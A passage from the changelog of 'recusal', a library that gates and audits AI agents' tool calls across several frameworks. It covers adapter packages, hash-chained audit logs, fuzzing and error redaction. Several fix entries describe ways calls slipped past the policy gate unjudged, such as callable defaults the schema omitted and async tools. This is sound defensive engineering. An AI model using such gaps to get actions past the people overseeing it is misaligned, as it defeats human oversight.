  from an existing file, and every `append` after it raised `UnicodeDecodeError` when the
  file held one such byte, although the reader's own contract is that a corrupt line is
  skipped so that a damaged tail cannot brick the log. The backward tail reader already
  skipped such a line; the forward one opened the file as text and did not. It now reads
  bytes and decodes each line on its own, so the damage costs that line only. Found by
  the fuzzing below, in its first few thousand inputs. Unchanged: `verify_file` and
  `recusal audit verify` still report such a file as unreadable (exit 2), an append still
  refuses an unterminated damaged tail with `AuditFramingError`, and a file of valid
  UTF-8 reads exactly as before. It failed safe (a gate with an unwritable log refuses
  the call), so no decision was ever allowed by it.
- `recusal-openai` 0.2.0: an `async def` tool is refused with a reason before the policy
  runs. The gate for a loop you own on the OpenAI API calls tools synchronously; before,
  it allowed an async tool, recorded the call as allowed, and answered the model with the
  text of a coroutine that was never awaited, so the tool did not run. A tool declared
  async behind a `functools.partial`, a `staticmethod`, a bound method, an object with an
  async `__call__` or an async generator is refused the same way, and so is a function
  marked with `inspect.markcoroutinefunction`. The policy is no longer consulted for such
  a call, and in the audited loop its entry is one deny for `recusal_unjudgeable_input`,
  where it used to be whatever the policy decided. An ordinary function that returns a
  coroutine or an async generator is now answered as not run, where it used to be
  answered with the object's `repr`; a coroutine that was never started is closed, and
  one that has started is left alone.
- `recusal-openai`: the README and `docs/FRAMEWORKS.md` said a hosted tool call both
  raises in the loop and never reaches it. The provider's record of the call does reach
  the loop, and it raises. They now say so, and say that a remote MCP
  `mcp_approval_request` is not gated: it raises, so it is never approved through the
  gate.

### Added

- Coverage-guided fuzzing of the kernel's untrusted-input seams, with
  [ClusterFuzzLite](https://google.github.io/clusterfuzzlite/) (libFuzzer through
  atheris). Five harnesses under `fuzz/`, each stating the contract it holds its target
  to: the audit log readers, the Claude Code `PreToolUse` hook's event parser, the MCP
  manifest loader, `compute_verdict`, and the reference deny-list. `.github/workflows/fuzz.yml`
  runs them briefly on every pull request that touches the kernel or a harness and for
  longer each week against `main`; the build image is pinned by digest and the build
  downloads nothing. `tests/test_fuzz_harnesses.py` runs the same harnesses on their seeds
  and on deterministic mutations in the ordinary suite, on every supported Python, with a
  negative control showing a harness fails when its target misbehaves. `fuzz/README.md`
  says how to run one locally.
- `recusal-openai` 0.2.0: two keywords, both off by default. A loop that passes neither
  gets the outcome 0.1.1 gave, with three exceptions: the async tool and the returned
  coroutine above, and the text of the `TypeError` for a provider's record, which now
  names the keyword below.
  - `answer_tool_errors=True` (on `gate_function_calls`, `gate_tool_calls`, their audited
    forms and `judge_and_run`). By default a tool that raises still reaches the
    application, after earlier calls in the turn have run, and no later call runs. With
    the keyword the failed call is answered with `` Tool `name` raised <ExceptionClass> ``
    under its own id, the earlier answers are kept, **the calls after it are judged and
    run**, and the traceback goes to the `recusal_openai` logger. The class named is the
    exception's nearest built-in one: never the message, and never a class name an
    application or a library chose.
  - `allow_hosted_records=True` (on `gate_function_calls` and `audited_function_calls`),
    with the public `HOSTED_RECORD_TYPES` and `HOSTED_RECORD_FINISHED`. By default the
    provider's record of a hosted tool call still raises, now with a message that names
    the keyword. With it, a finished `web_search_call`, `file_search_call`,
    `code_interpreter_call`, `image_generation_call`, `mcp_call`, `mcp_list_tools` or
    `compaction` item passes, unjudged, unanswered and off the audit log. A record whose
    status is not finished still raises, and so does every other item type the SDK
    defines, held by a test that reads the SDK's own union.
  - The package's smoke test proves each of these on the installed wheel.
- `recusal-pydantic-ai` now declares complete, framework-compatible function annotations
  and is checked by CI with strict missing-annotation flags, contributed by
  [@hananbahi527](https://github.com/hananbahi527) in
  [#270](https://github.com/philpaz/recusal/pull/270). The package's version is now 0.1.2
  for this change: annotations only, with the same behaviour and the same requirements
  as 0.1.1.
- The weekly latest-framework workflow (`compat.yml`) now also builds each adapter's
  wheel, installs it beside the newest release of its framework and runs its
  `smoke_test.py` from outside the checkout, one row per adapter, with a test that holds
  the rows to the adapter directories on disk. Contributed by
  [@noqt](https://github.com/noqt) in
  [#268](https://github.com/philpaz/recusal/pull/268).

### Removed

- `assets/banner-gate.png`, `assets/banner-ledger.png` and `assets/banner-seal-light.png`:
  three banner variants that no page, test, workflow or package in the repository
  referenced. The banner the README shows, `banner-gate-strip.png` and its light variant,
  is unchanged. The wheel never contained them. The source distribution carries the
  `assets` directory, so the next release's will be smaller by these three files.

## [0.14.1] - 2026-11-14

A PATCH release under `STABILITY.md` that changes no behaviour. The only line that differs
under `recusal/` between 0.14.0 and this release is the version string: the verdict
kernel, the decision path, the audit log, every reason string and every import path are
the files 0.14.0 shipped. It is released so that the page PyPI shows for `recusal`, which
is this repository's README at the time of a release, describes the project as it now
stands: the eight adapter packages (each on PyPI under its own name and version, released
by its own tag), the audited route on every framework gate, and the figures. It also
corrects a link on that page that was relative and so led nowhere on PyPI. Everything
listed below was added to the repository since 0.14.0; the adapter packages among it are
separate distributions and are not part of the `recusal` wheel.

### Added

- All eight adapter packages are on PyPI, each published by `release-adapter.yml` through
  trusted publishing on 2026-11-14 and each checked afterwards by *Verify a published
  adapter release* from the published artifacts alone. Every package was published as
  0.1.0 and then as 0.1.1. The only difference in 0.1.1 is the README, which is the page
  PyPI shows: 0.1.0's said the package was not on PyPI and gave an install-from-repository
  line, and 0.1.1's gives `pip install <package>`. No code changed between them. The
  main README, `adapters/README.md`, `docs/ARCHITECTURE.md` and `docs/COOKBOOK.md` say the
  same, and `tests/test_readme_front_page.py` now fails if any of those places, or any
  adapter's README, goes back to an install-from-repository line or stops naming the
  package's own `pip install`. `adapters/README.md` also records what the first releases
  showed: PyPI accepts one pending publisher at a time for a given repository, workflow
  and environment, so new adapters are registered and released one after another.

- `examples/pydantic_ai_audit.py`: the Pydantic AI audit trail, the second framework gate
  with an audited route (LangGraph was the first). `RecusalAuditedGate(policy, log=log)`
  and `recusal_audited_before_tool_execute(policy, log)` call the plain gate's own
  `_refusal` with the recording arguments passed through to `decide`, so the decision is
  the plain gate's and each call the hook sees, allowed or refused, is one hash-chained
  `AuditLog` entry labeled `pydantic_ai.before_tool_execute` under Pydantic AI's tool call
  id. The entry for a judged call carries the fingerprint of the arguments the tool is
  called with, whatever the policy did to its copy and whatever an earlier capability
  rewrote. A call refused before judgment (arguments the gate cannot detach) is one deny
  entry bound to the call as the model proposed it. An unwritable log or a failing sink
  refuses the call. A call Pydantic AI rejects at validation never reaches the hook: it
  does not run and is not on the log. The plain gate's decisions and reason strings are
  unchanged. From the 2026-11-11 architecture review.
- `examples/openai_responses_audit.py`: the audit trail for the OpenAI loop an application
  owns, both API shapes. `audited_function_calls` (Responses) and `audited_tool_calls`
  (Chat Completions) call the plain gate's own functions with the recording arguments
  passed through to `decide`, so each call the model proposes, run or refused, is one
  hash-chained `AuditLog` entry labeled `openai.responses.function_call` or
  `openai.chat_completions.tool_call` under the API's call id. The entry for a judged
  call carries the fingerprint of the bound invocation the tool is called with, so a
  default the model omitted is recorded at the value that runs. A call refused before
  judgment (invalid JSON, a non-object, an unknown tool, a signature that cannot be
  judged, arguments that do not bind) is one deny entry bound to the arguments as
  proposed. An unwritable log or a failing sink refuses the call. A turn refused as a
  whole raises before anything is judged, runs nothing and writes no entry. The plain
  gate's decisions and reason strings are unchanged.
- `examples/google_adk_audit.py`: the Google ADK audit trail. `audited_agent(agent, policy,
  log)` is `gated_agent` and `audited_plugin(policy, log)` is `RecusalPlugin`, each with a
  `recording` (a new optional argument of `gated_agent`, `recusal_before_tool` and
  `RecusalPlugin`) that passes the recording arguments through to `decide`, so each call
  a gate sees, allowed or refused, is one hash-chained `AuditLog` entry labeled
  `google_adk.before_tool_callback` under the ADK's function call id, for the agent and
  for every sub-agent and agent tool it gates. The entry for a judged call carries the
  fingerprint of the prepared invocation the tool is called with. A call refused before
  judgment, including a plugin that is not the last before-tool seam, is one deny entry
  bound to the arguments as proposed. An unwritable log, a failing sink or a `recording`
  that raises refuses the call. A call another callback answered before the gate ran is
  not on the log. The plain gate's decisions and reason strings are unchanged.
- `examples/openai_agents_audit.py`: the audit trail for OpenAI Agents SDK function tools.
  `audited_agent(agent, policy, log)` is `gated_agent` and `audited_tools(tools, policy,
  log)` is `gate_tools`, each with a `recording` (a new optional argument of both) that
  passes the recording arguments through to `decide`, so each call a guardrail sees,
  allowed or refused, through `Runner.run` or `Runner.run_streamed`, is one hash-chained
  `AuditLog` entry labeled `openai_agents.tool_input_guardrail` under the SDK's tool call
  id. The entry for a judged call carries the fingerprint of the invocation the SDK
  prepared, so a default and a coerced value are recorded as the function receives
  them. A call refused before judgment is one deny entry bound to the arguments as
  proposed. An unwritable log, a failing sink or a `recording` that raises refuses the
  call. A call waiting for approval is recorded when it is about to run; a call a person
  rejected, and a call to a tool the agent does not have (the SDK raises), are not on
  the log. The plain gate's decisions and reason strings are unchanged.
- `examples/openai_agents_mcp_audit.py`: the audit trail for OpenAI Agents SDK MCP tools.
  `audited_agent(agent, policy, log)` is the MCP example's `gated_agent` with a
  `recording` (a new optional argument of `gated_agent`, `gate_mcp_server`,
  `gate_hosted_mcp` and `recusal_approval`), so one hash-chained `AuditLog` covers the
  agent's three seams, each under its own surface label. A local server's entry is
  labeled `openai_agents.mcp.call_tool`, names the server as `control.mcp_server`, is
  bound to the arguments the server receives, and carries no call id, because the SDK
  hands `call_tool` none. A hosted approval's entry is labeled
  `openai_agents.hosted_mcp.approval` under the approval request's id; it records
  Recusal's decision, not what the tool's own approval callback then answered. An
  unwritable log, a failing sink or a `recording` that raises refuses the call or
  rejects the approval. A server is a shared connection and carries one recording:
  gating it again with another is refused, as another policy is. The plain gate's
  decisions and reason strings are unchanged.
- `examples/langchain_agent_audit.py`: the audit trail for a LangChain `create_agent`
  agent. `audited_gate_middleware(policy, log)` and `audited_agate_middleware(policy, log)`
  wrap the LangGraph audited hooks as middleware, so each call the agent proposes,
  allowed or refused, sync or async, is one hash-chained `AuditLog` entry labeled
  `langchain.create_agent` under the tool call id. `recusal_audited_gate` and
  `recusal_audited_agate` in `examples/langgraph_audit.py` take an optional `surface` for
  that label; their default, `langgraph.toolnode`, is unchanged. An argument rewrite by a
  middleware listed after the gate is recorded as rewritten; a middleware listed after
  it that answers in the tool's place leaves the call unjudged and unrecorded, so list
  the gate last.
- `examples/crewai_audit.py`: the CrewAI audit trail, which completes the set: every
  framework gate under `examples/` now has an audited route. `install_audited_hooks(policy,
  log)` is `install_recusal_hooks` with a `recording` (a new optional argument of
  `install_recusal_hooks` and `recusal_before_tool_call`), so each call the before hook
  sees, allowed or refused, is one hash-chained `AuditLog` entry labeled
  `crewai.before_tool_call`. CrewAI's hook context carries no call id, so the entries
  carry none; the agent's role is recorded as `control.crewai_agent`. The entry for a
  judged call carries the fingerprint of the prepared invocation CrewAI executes,
  defaults completed and values validated. A call refused before judgment is one deny
  entry bound to the arguments as proposed. An unwritable log, a failing sink or a
  `recording` that raises blocks the call. A call a hook registered before the gate
  blocked is not on the log. The plain gate's decisions and reason strings are
  unchanged.

- `adapters/pydantic-ai`: the Pydantic AI gate as its own distribution,
  `recusal-pydantic-ai` 0.1.0 (`from recusal_pydantic_ai import RecusalGate,
  RecusalAuditedGate, recusal_before_tool_execute, recusal_audited_before_tool_execute,
  is_gated, SURFACE`). It depends on `recusal>=0.14.0,<1` and
  `pydantic-ai-slim>=2.64.0,<3`, needs Python 3.11+, and was published to PyPI on 2026-11-14. The gate's code moved out of
  `examples/pydantic_ai_gate.py` and `examples/pydantic_ai_audit.py` unchanged, and
  those files now import the package and keep the offline demonstration. One
  difference from the example: `RecusalGate(policy)` requires its policy, where the
  example defaulted to the demonstration SQL policy. Nothing under `recusal/` changed,
  and the kernel declares no dependency on, and imports nothing from, the adapter;
  `tests/test_adapter_packages.py` holds that boundary. A new CI job builds the kernel
  and the adapter with the hash-locked toolchain, installs both wheels in a clean
  environment and runs the adapter's smoke test from outside the checkout.
- `adapters/openai`: the gate for a Responses or Chat Completions loop you own as its own
  distribution, `recusal-openai` 0.1.0 (`from recusal_openai import gate_function_calls,
  gate_tool_calls, judge_and_run, audited_function_calls, audited_tool_calls,
  SURFACE_RESPONSES, SURFACE_CHAT`). It depends on `recusal>=0.14.0,<1` and
  `openai>=3.34.0,<4`, needs Python 3.10+, and was published to PyPI on 2026-11-14. The gate's
  code moved out of `examples/openai_responses_gate.py` and
  `examples/openai_responses_audit.py` unchanged; those files import the package and
  keep the offline demonstration. Nothing under `recusal/` changed. The same locks and
  the same kind of CI job (build, install both wheels, smoke test from outside the
  checkout) cover it.
- `adapters/google-adk`: the Google ADK gate as its own distribution, `recusal-google-adk`
  0.1.0 (`from recusal_google_adk import gated_agent, RecusalPlugin, recusal_before_tool,
  is_gated, audited_agent, audited_plugin, recording, SURFACE`). It depends on
  `recusal>=0.14.0,<1` and `google-adk>=2.13.0,<3`, needs Python 3.11+, and was
  published to PyPI on 2026-11-14. The gate's code moved out of `examples/google_adk_gate.py` and
  `examples/google_adk_audit.py` unchanged; those files import the package and keep the
  offline demonstration. Nothing under `recusal/` changed. The package tables in
  `README.md` and `docs/ARCHITECTURE.md` now list every adapter package, and
  `tests/test_adapter_packages.py` fails if a table and the packages disagree.
- `adapters/openai-agents`: the OpenAI Agents SDK function-tool gate as its own
  distribution, `recusal-openai-agents` 0.1.0 (`from recusal_openai_agents import
  gated_agent, gate_tools, recusal_guardrail, is_gated, audited_agent, audited_tools,
  recording, SURFACE, GUARDRAIL_NAME`). It depends on `recusal>=0.14.0,<1` and
  `openai-agents>=0.24.0,<1`, needs Python 3.10+, and was published to PyPI on 2026-11-14. The
  gate's code moved out of `examples/openai_agents_gate.py` and
  `examples/openai_agents_audit.py` unchanged; those files import the package and keep
  the offline demonstration. `examples/openai_agents_mcp_gate.py`, still an example,
  imports the three helpers it shares with the function-tool gate from the package.
  Nothing under `recusal/` changed.
- `adapters/langgraph`: the LangGraph `ToolNode` gate as its own distribution,
  `recusal-langgraph` 0.1.0 (`from recusal_langgraph import recusal_gate, recusal_agate,
  recusal_audited_gate, recusal_audited_agate, RecusalRefusal, SURFACE`). It depends on
  `recusal>=0.14.0,<1`, `langgraph>=1.2.12,<2` and `langchain-core>=1.6.5,<2`, needs
  Python 3.10+, and was published to PyPI on 2026-11-14. The gate's code moved out of
  `examples/langgraph_gate.py` and `examples/langgraph_audit.py` unchanged; those files
  import the package and keep the offline demonstration. The LangChain `create_agent`
  examples, which wrap the same hooks, are unchanged and reach the package through those
  two files. Nothing under `recusal/` changed.
- `adapters/langchain`: the LangChain `create_agent` middleware as its own distribution,
  `recusal-langchain` 0.1.0 (`from recusal_langchain import gate_middleware,
  agate_middleware, audited_gate_middleware, audited_agate_middleware, SURFACE`). It
  depends on `recusal>=0.14.0,<1`, `recusal-langgraph>=0.1.0,<1` and `langchain>=1.4.3,<2`,
  needs Python 3.10+, and was published to PyPI on 2026-11-14. It adds no decision logic: it
  wraps the public hooks of `recusal-langgraph` as middleware and names its own surface on
  the record. The packaged `gate_middleware(policy)` requires its policy; the example
  keeps the demonstration SQL policy as its default. `tests/test_adapter_packages.py` now
  also holds that an adapter importing another adapter uses that package's top-level
  names only. Nothing under `recusal/` changed.
- `adapters/crewai`: the CrewAI tool-call hooks as their own distribution,
  `recusal-crewai` 0.1.0 (`from recusal_crewai import install_recusal_hooks,
  recusal_before_tool_call, recusal_after_tool_call, install_audited_hooks, recording,
  SURFACE, BLOCKED_PREFIX, PENDING_LIMIT`). It depends on `recusal>=0.14.0,<1` and
  `crewai>=1.15.34,<2`, needs Python 3.10+, and was published to PyPI on 2026-11-14. The gate's
  code moved out of `examples/crewai_gate.py` and `examples/crewai_audit.py` unchanged;
  those files import the package and keep the offline demonstration. The package sets no
  environment variables; turning CrewAI's telemetry off stays in the examples. Nothing
  under `recusal/` changed.
- `adapters/openai-agents-mcp`: the OpenAI Agents SDK MCP gate as its own distribution,
  `recusal-openai-agents-mcp` 0.1.0 (`from recusal_openai_agents_mcp import gated_agent,
  gate_mcp_server, gate_hosted_mcp, recusal_approval, claude_named, is_gated,
  is_gated_mcp_server, is_gated_hosted_mcp, audited_agent, recording, SURFACES`). It
  depends on `recusal>=0.14.0,<1`, `recusal-openai-agents>=0.1.0,<1`,
  `openai-agents>=0.24.0,<1` and `mcp>=2.3.0,<3`, needs Python 3.10+, and was published
  to PyPI on 2026-11-14. The gate's code moved out of `examples/openai_agents_mcp_gate.py` and
  `examples/openai_agents_mcp_audit.py` unchanged. `recusal-openai-agents` gains three
  public names the MCP gate builds on, `refusal`, `unjudgeable` and `duplicate_names`, so
  no adapter imports another's private module. With this every framework gate under
  `examples/` is an installable package. Nothing under `recusal/` changed.
- A release path for the adapter packages, separate from the kernel's.
  `release-adapter.yml` publishes one adapter per GitHub Release whose tag is
  `<package>-v<version>`: the full gate at the release commit, then the adapter's own
  tests with its pinned framework (none may skip), a hash-locked build delegated to the
  reusable `build-adapter-dist.yml` with a smoke test of the built wheel, an SBOM and a
  build-provenance attestation, Sigstore signing, and trusted publishing.
  `verify-adapter-release.yml` checks a published adapter from its artifacts alone, with
  the kernel's own two workflows as negative controls. `tools/adapter_meta.py` resolves
  an adapter from its files and refuses a tag that names no adapter or another version.
  Each adapter's `tested-with.txt` holds the framework pins a release installs, equal to
  the pull request lane's. `adapters/README.md` has the steps. No adapter has been
  released, and the kernel's builder and its signing identity are unchanged.
- The eight adapter packages ship inline types (`py.typed`, `Typing :: Typed`). Each
  adapter's wheel job, and the release build, now type-checks the installed package with
  mypy against its framework's own types, bodies of unannotated functions included.
  Getting there took six typing-only changes in five packages and none in behaviour: an
  `Any`-typed local where the SDK's types cannot follow a runtime check
  (`recusal-openai`, `recusal-google-adk`, `recusal-crewai`,
  `recusal-openai-agents-mcp`), the decorator form of `tool_input_guardrail`, which
  builds the same guardrail (`recusal-openai-agents`), and one `type: ignore` where MCP's
  model takes its error flag by its wire name. Not every function is annotated.
- `tests/test_markdown_links.py`: every link in every tracked Markdown file that points
  into this repository resolves, whether a relative path, an absolute link to the main
  branch, or a heading anchor. All of them did; nothing held it.

### Fixed

- `tests/test_crewai_audit.py`: the end-to-end test of the audit example asserted that
  the refused call was the second entry on the chain. CrewAI runs one turn's tool calls on
  a thread pool, so the entries can land in any order and the test could fail on a correct
  run. It now asserts the refused entry is present and that there are three, without a
  position. No example or package behaviour changed.
- `tests/test_openai_agents_mcp_gate.py`: nothing held that a refused local MCP call
  comes back flagged as an MCP error; deleting the flag went unnoticed. A test now
  holds that a refusal is an error result carrying the reason and an allowed call is
  not. The gate's behaviour is unchanged.

### Changed

- `docs/ENTERPRISE.md`, after a review that found four gaps. It is still a position
  with nothing built. (1) A restore from a backup could revive a revoked or exhausted
  grant, since reconciling in-flight actions sees no lost revocation, reservation or
  activation: new section 6.10 invalidates every restored grant by advancing the epoch
  past every epoch the audit destination holds, and accounts for every action from the
  audit destination's intent events, including actions absent from the backup.
  (2) Failover had a fencing rule and no durability rule: section 6.8 now promotes only
  the most advanced of at least `n - k + 1` listed synchronous standbys, and treats a
  promotion that cannot prove completeness as a restore. (3) The re-send transaction
  omitted the active-policy lock and the state change: section 6.5 spells out the lock
  order, the guarded `OUTCOME_UNKNOWN` to `DISPATCHING` transition and every check.
  (4) One pause flag was described with two scopes: section 6.9 separates a global
  pause, which stops every grant and is now checked by the promotion transaction too,
  from a per-grant admission suspension, with who may set and clear each. Scenarios
  A26, A35, A41, A42 and A43 are rewritten to match and A44 and A45 are new.
  `tests/test_enterprise_doc.py` holds the document to itself: scenario and section
  references resolve, states are the seven defined, every locking transaction states
  one lock order and checks the pause.
- `README.md`: the adapter packages have their own section near the top, *The kernel
  and its adapters*, with a picture of the dependencies, in place of a passage 850 lines
  down. The opening paragraph names the eight packages where it named one LangGraph
  example. The picture, `assets/adapter-map.svg` and its light variant, is generated by
  `tools/render_adapter_map.py` from the adapters' own `pyproject.toml` files, and
  `tests/test_adapter_map.py` fails if the committed files differ from what it prints.
  `adapters/README.md` carries the same dependencies as a Mermaid diagram, held to the
  packages by a test, and `docs/README.md` links the packages.
- `README.md`: a contents line under the badges, and a short note of what is new on
  `main` since the last release, which said the adapters were not on PyPI (they are now) and that the
  kernel package is unchanged. `tests/test_readme_front_page.py` fails when the note's
  version stops being the released one, when its adapter count is wrong, or when the
  places that say the adapters are unpublished stop agreeing. Cutting a release
  therefore means rewriting or removing the note.
- The package tables in `README.md` and `docs/ARCHITECTURE.md` are in package-name
  order.
- `README.md`, *How it works*: the text diagram is a picture, `assets/verdict-pipeline.svg`
  and its light variant, generated by `tools/render_pipeline.py`. Which severity gives
  which verdict is asked of `compute_verdict` at render time and never typed, and
  `tests/test_verdict_pipeline.py` fails if the committed files differ from what the
  generator prints or from what the kernel does.
- `README.md`, *What Recusal does*: a picture of where the gate sits, between the call
  an agent proposes and the tool that would run it, `assets/gate-position.svg` and its
  light variant, generated by `tools/render_gate.py`. What it says the gate does for a
  policy with no objection, a failing finding and a policy that raises is asked of
  `decide` at render time, and `tests/test_gate_position.py` holds it there.
- `README.md`, *Any agent loop*: about 240 lines of per-framework prose moved, word for
  word, to a new page, `docs/FRAMEWORKS.md`, one section per framework. The README keeps
  a table: framework, package, the exact versions tested, the offline examples, and a
  link to that framework's section. `tests/test_framework_gates.py` holds the table to
  the packages, the pins and the example files, and keeps the prose off the home page.
- `README.md`, *Documentation*: a table grouped by what the reader is trying to do, in
  place of a paragraph of links; every document under `docs/` is in it once. A new
  section, *Built to be checked*, states what the project does to hold itself to its
  own rule (tests and where they run, no runtime dependencies, the framework lanes,
  the conformance suite, how releases are made and verified, its own hook, its stated
  limits), each row citing the file that proves it. `tests/test_readme_tables.py`
  checks each row against that file, including the stated test count as a floor.
- `release.yml` runs only for the kernel's own `vX.Y.Z` tags and for a manual
  rehearsal. Every published GitHub Release reaches it, and an adapter's release is
  not a release of `recusal`; before this it would have built the kernel again and
  failed at publish. Nothing about a kernel release changes.
- Documentation: `docs/ARCHITECTURE.md` and `docs/HOWTO.md` list every framework gate's
  audited route with its surface label and call id, `CONTRIBUTING.md` makes the audited
  route part of adding a runtime, `docs/EXTENDING.md` points an adapter author at
  `decide` and `recusal.invocation`, and `SECURITY.md` states that exception text is
  quoted unless `safe_errors` is selected and that an integer-keyed audit entry written
  before 0.14.0 does not verify. `tests/test_audited_routes.py` fails if a framework
  gate has no audited companion or a documented surface label stops matching the code.
- Documentation: `docs/ENTERPRISE.md`, a reference architecture for an isolated
  enterprise deployment (an authenticated broker, immutable prepared actions, budget and
  replay enforced in the database, audit acknowledgement before dispatch, a separate
  executor holding the only business credential), indexed from `docs/README.md`. It is a
  position on how it would be built. Nothing in it is built, deployed or validated, and it
  does not advance the 1.0 criteria in `STABILITY.md`.

## [0.14.0] - 2026-11-11

The two remaining findings of the 2026-11-06 architecture review, and the first
work from the 2026-11-11 review. This is a MINOR release under `STABILITY.md`: it
adds public surface (`safe_errors`, `recusal.invocation`, `decide` importable from
the package, `findings_of` and `identity_getter`) and removes or renames nothing.
Every existing import path resolves to the same object, and without `safe_errors`
every reason string is byte for byte what it was. The verdict kernel, manifest v8
and valid fingerprint bytes are unchanged. Audit entries that are plain JSON with
string keys hash exactly as 0.13.1 hashed them.

### Added

- `safe_errors`, a keyword-only option on `decide`, `run_pretooluse_hook`, `gate_tool_use`
  and `tool_confirmation`, off by default. When a policy, the input fingerprint, the audit
  write, the hook's envelope or the evidence raises an unexpected exception, the reason
  returned to the caller and the finding stored on the audit record have always quoted the
  exception's text, and that text can carry whatever its raiser put in it (a connection
  string, a credential, a row). With `safe_errors=True` a stable code and the exception's
  class name stand in its place: `RECUSAL_POLICY_ERROR`, `RECUSAL_INPUT_BINDING_ERROR`,
  `RECUSAL_AUDIT_UNAVAILABLE`, `RECUSAL_MALFORMED_EVENT` and `RECUSAL_INVALID_EVIDENCE`,
  as in `Recusal failed closed (policy error): RECUSAL_POLICY_ERROR (RuntimeError)`. The
  decision, the severity and the fail-open behavior are identical in both modes, and the
  messages of findings a policy returns are never rewritten. Without the option every
  reason string and every audit record is byte for byte what it was. From the 2026-11-06
  architecture review (P2). A separate destination for the withheld exception detail,
  for operators, is not part of this change.
- `recusal.invocation`, the data-only checks a gate needs in any framework, in one place:
  `supported_annotation`, `json_data`, `unsupported_signature` and `detached`. The CrewAI,
  Google ADK, OpenAI Responses and Pydantic AI gates under `examples/` each carried a copy
  (three of `json_data`, two of `unsupported_signature`, three of `supported_annotation`,
  one of `detached`); they now import these, the code is the code they had, and a test
  refuses a second definition under `examples/`. No gate decides differently. Standard
  library only, and it works on Python 3.9, where the copies needed 3.10. From the
  2026-11-11 architecture review.
- `decide` and `Policy` are importable from the package: `from recusal import decide`. The
  evaluator every runtime's gate calls was reachable only as `recusal.claude_code.decide`,
  a Claude Code address for a function that knows nothing about Claude Code. Both paths
  are the same function, and the old one stays.
- `findings_of` and `identity_getter` in `recusal.claude_code`, public names for the two
  contracts a policy composer shares with the evaluator (the return contract and the
  control-identity lookup). They are the same objects as `_findings_of` and
  `_identity_getter`, which stay. The examples that imported the private names
  (`composed_policies.py`, `openai_agents_mcp_gate.py`) use the public ones, every
  framework gate imports `decide` from `recusal`, and a test refuses an example that
  imports a private name from the package.

### Fixed

- An audit log nobody had touched could fail verification. The entry hash was taken over
  the entry in memory, and a verifier hashes the entry as read back from the file. An
  `action` or `control` value with integer keys, such as `{1: "a", 2: "b", 10: "c"}`,
  sorts 1, 2, 10 in memory and "1", "10", "2" once stored, so `verify_file` and
  `recusal audit verify` reported `content tampered - hash does not match` on an honest
  record while `verify(log.entries)` in the writing process passed. The hash is now taken
  over the stored form of the entry, and the entry `append` returns, keeps in `entries`
  and hands to sinks is that same form (a tuple is a list, a non-JSON object is its text,
  as the file has always held them). An entry with mixed integer and string keys, which
  used to fail the append, is recorded. Every entry that is plain JSON with string keys
  hashes exactly as before, pinned against the hash 0.13.1 wrote, so existing logs verify
  unchanged. A log already written with integer keys by an earlier version still fails
  verification at those entries. From the 2026-11-11 architecture review.

### Changed

- Every framework adapter under `examples/` (LangGraph, LangChain, CrewAI, the OpenAI
  Agents SDK function and MCP tools, the OpenAI Responses and Chat Completions loops,
  Google ADK, Pydantic AI) now calls `decide(..., safe_errors=True)`, and its own outer
  exception handler names the code and the class as well. A policy that raises is still
  refused and nothing runs; the text the model reads changes from
  `Recusal failed closed (policy error): <exception text>` to
  `Recusal failed closed (policy error): RECUSAL_POLICY_ERROR (<ExceptionClass>)`, and the
  audited LangGraph route records the same. The OpenAI Agents gate's "cannot name its
  validated arguments" refusal names the exception class instead of its text. Conformance
  invariant 4 now requires the code and the absence of the exception text on every route.
  The adapters remain examples outside the compatibility perimeter of `STABILITY.md`.
- The deployed hooks select `safe_errors=True` as well: the Claude Code plugin
  (`claude-plugin/scripts/recusal_gate.py`), the gate script `recusal init` writes (both
  postures) and the two example hooks (`examples/claude_code_gate.py`,
  `examples/allowlist_gate.py`). For a plugin user this changes one thing: when the policy
  or the audit write raises, or the event cannot be read, the deny reason Claude reads and
  the audit record name a code and the exception's class instead of quoting the
  exception. Every other reason is unchanged. A gate script already on disk is not
  touched and keeps the previous text until `recusal init` is run again or
  `safe_errors=True` is added to its `run_pretooluse_hook` call; a gate written by this
  version needs this version of the package, since earlier ones do not accept the keyword
  (the launcher refuses every call rather than run a gate that fails to start).
- The Pydantic AI gate (`examples/pydantic_ai_gate.py`) refuses every Enum member before
  the policy runs, on both the capability and the `Hooks` route. Since 0.13.0 it had
  accepted a member whose value was an immutable JSON scalar and handed the same member
  to the policy and to the tool. A member is one shared object, so state its class sets
  on it (an `__init__` that stores `self.payload = {...}`) was shared too, and a buggy
  policy's mutation of that state executed. Passing only `.value` would hide that state
  from the policy while the tool still used it, so the gate refuses instead: `Enum`,
  `IntEnum` and `StrEnum` members, at the top level or nested in a list or dict. This
  narrows what the example accepted. To migrate, declare the parameter as `str` or `int`
  and resolve the Enum inside the tool body. From the 2026-11-06 architecture review
  (P2); the adapter remains an example outside the compatibility perimeter of
  `STABILITY.md`.

## [0.13.1] - 2026-11-09

One integrity fix from the 2026-11-06 architecture review: the LangGraph, LangChain and
CrewAI gates refuse a call whose callable declares a parameter the argument schema
omits, before the policy runs. This is a PATCH release under `STABILITY.md`: the change
is in the adapter examples, outside the compatibility perimeter, and `recusal/` changes
only its version. The verdict kernel, manifest v8 and valid fingerprint bytes are
unchanged. The review's two other findings (Enum members on the Pydantic AI gate and the
model-safe error formatter) are separate work.

### Fixed

- The LangGraph, LangChain and CrewAI gates executed a callable parameter the argument
  schema omitted without judging it: `charge(label, amount=100)` behind a schema that
  declares only `label`, proposed as `{"label": "review"}`, reached the policy as
  `{"label": "review"}` and ran with `amount=100`, on every route (LangGraph sync and
  async, the LangChain middleware on both, the CrewAI Crew runner), and the audited
  LangGraph route bound the fingerprint of that incomplete observation. Python fills a
  parameter the parsed arguments leave out from the callable's own default, after the
  policy has judged, so the callable, not the schema, is the authority on what executes.
  The gates now hold the callable the route executes to the schema: every named parameter
  it declares must be a schema field, a key the host injects, or a name the SDK reserves
  and fills at call time (LangGraph: `callbacks`, `run_manager` and the `RunnableConfig`
  parameter, found as the SDK finds them; CrewAI fills none); any other parameter, and a
  positional-only one, refuses the call before the policy runs, naming the parameter and
  never its default. Declare the parameter in the schema and the same call is judged at the
  value that runs. The LangGraph gate also selects the callable the route runs (the
  `coroutine` on the async route when the tool has one, the class's `_arun` when it
  overrides the default) instead of always `func`, so a default that differs between the
  sync and async implementations is completed from the one that executes. CrewAI inspects
  the application function a stock `Tool` wraps, not the wrapper's `*args, **kwargs`. The
  conformance suite gains invariant 12 (a callable parameter the schema omits refuses
  before judgment) across the three adapters' five routes, with the ungated control. From
  the 2026-11-06 architecture review (P1); the adapters remain examples outside the
  compatibility perimeter of `STABILITY.md`.

## [0.13.0] - 2026-11-05

Two integrity fixes from the company-adoption review: audit appends preserve readable
